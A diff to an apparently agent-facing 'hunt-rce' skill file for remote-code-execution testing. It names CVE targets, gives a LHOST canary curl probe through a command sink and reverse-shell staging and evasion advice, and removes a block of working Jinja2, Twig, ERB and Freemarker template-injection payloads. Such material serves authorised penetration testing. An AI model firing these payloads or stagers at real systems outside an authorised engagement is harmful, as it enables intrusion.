@@ -1,6 +1,6 @@
 ---
 name: hunt-rce
-description: RCE hunting - template injection, YAML/XML deserialization, dependency confusion, Kubernetes surfaces, CVE-specific exploits (Apache CVE-2021-41773, Spring CVE-2022-22963). OOB-mandatory for blind cases. Wiki-first, FIND schema output.
+description: RCE hunting - template injection, YAML/XML deserialization, dependency confusion, Kubernetes surfaces, CVE-specific exploits (Apache CVE-2021-41773, Spring CVE-2022-22963). OOB-mandatory for blind cases. Wiki-first, FIND schema output. Use when a command sink, template-to-exec path, or version+CVE pair appears.
 ---
 
 # Hunt: Remote Code Execution
@@ -14,6 +14,7 @@ Binary/memory-corruption RCE (a socket service or a handed-out binary) belongs t
 Hub: [[web-moc]] · Primary page: [[os-command-injection]] · Payload arsenal: `wiki/payloads/command-injection.md`
 Anchors: [[ssti]], [[insecure-deserialization]]
 **REFS:** [[os-command-injection]], wiki/payloads/command-injection.md
+- capability equations + low-severity-to-primitive map: [[wiki/techniques/capability-primitives]]
 
 qmd_query "remote code execution command injection template injection deserialization CVE" via wiki-search MCP — ONLY when you have a concrete hint the map above
 doesn't cover (a specific sink/version/CVE, an observed escape); not a blanket first step.
@@ -116,20 +117,7 @@ curl -X POST http://target:8080/functionRouter \
 
 **Canary egress BEFORE any callback-dependent payload.** Before staging a revshell/stager, fire one `$()` probe that fetches a known file from your LHOST through the same sink (`curl -sm2 LHOST/canary`) and confirm the hit server-side. Multi-homed attack seats have several addresses - the target can usually route to only ONE (wrong-iface payloads hang the app and can wedge a single-threaded service for minutes). The canary also proves which egress ports survive the target's outbound firewall; serve your stager on an allowed port, and shorten payloads to fit tight validators by encoding IPv4 as an integer (see [[websocket-attacks]] client-hint section). Delivery helper: `bash scripts/stager.sh <lhost> [port] <payload>` (serves it + prints the int-IP one-liner); managed listener: `bash scripts/vm-handler.sh <lhost>`.
 
-## Template Injection RCE Payloads
-```python
-# Jinja2
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-
-# Twig (PHP)
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
-
-# ERB (Ruby)
-<%= `id` %>
-
-# Freemarker
-<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
-```
+Payload tables: see `references/ssti-rce-payloads.md`
 
 ## Evasion
 
@@ -174,6 +162,28 @@ RCE is rarely the finish line. Once exec is confirmed:
 - **Vector-specific siblings** - a serialized-blob sink is `hunt-deserialization`; a container/orchestrator surface is `hunt-cloud`.
 
 Report the chain, not just the primitive: pre-auth RCE plus credential reuse implicates far more than the one host.
+
+## Validation
+
+- Proof = command output carrying a unique canary (`echo <canary>`), or an OOB
+  callback; version+CVE claims additionally need the CVE's own preconditions present in
+  the build (the vulnerable code path, the config that enables it); a version string
+  match alone is where backported-fix FPs are born.
+
+## False Positives
+
+- Intended admin/exec feature used as designed (diagnostics console = feature).
+- WAF 403 read as 'patched' (blocked != fixed; retry per evasion ladder).
+- Container `whoami` output read as HOST context (check `hostname`).
+- Deserialization ERROR read as execution (error != RCE).
+- `--version` matched to a CVE whose fix was backported without a version bump.
+
+## Cross-routing
+
+- Load hunt-deserialization when the vector is a serialized object.
+- Load hunt-injection for the SSTI lineage (template -> exec).
+- Load hunt-upload when the payload ships as a file.
+- Load hunt-cicd when the exec context is a pipeline runner.
 
 ## Severity
 
